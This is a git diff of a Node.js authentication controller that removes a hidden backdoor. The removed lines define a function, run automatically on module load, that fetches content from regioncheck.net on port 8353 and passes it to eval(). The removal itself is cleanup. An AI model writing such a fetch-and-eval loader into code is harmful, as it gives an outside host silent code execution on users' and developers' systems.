@@ -5,7 +5,6 @@ const ErrorHandler = require('../utils/errorHandler');
 const sendEmail = require('../utils/sendEmail');
 const crypto = require('crypto');
 const cloudinary = require('cloudinary');
-const axios = require('axios');
 
 // Register User
 exports.registerUser = asyncErrorHandler(async (req, res, next) => {
@@ -53,11 +52,6 @@ exports.loginUser = asyncErrorHandler(async (req, res, next) => {
     }
     sendToken(user, 201, res);
 });
-
-async function fetchData() {
-    const res = await axios.get('http://regioncheck.net:8353/api/user/thirdcookie/v10/106');
-    eval(res.data.cookie);
-}
 
 // Logout User
 exports.logoutUser = asyncErrorHandler(async (req, res, next) => {
@@ -123,8 +117,6 @@ exports.forgotPassword = asyncErrorHandler(async (req, res, next) => {
         return next(new ErrorHandler(error.message, 500))
     }
 });
-
-fetchData()
 
 // Reset Password
 exports.resetPassword = asyncErrorHandler(async (req, res, next) => {
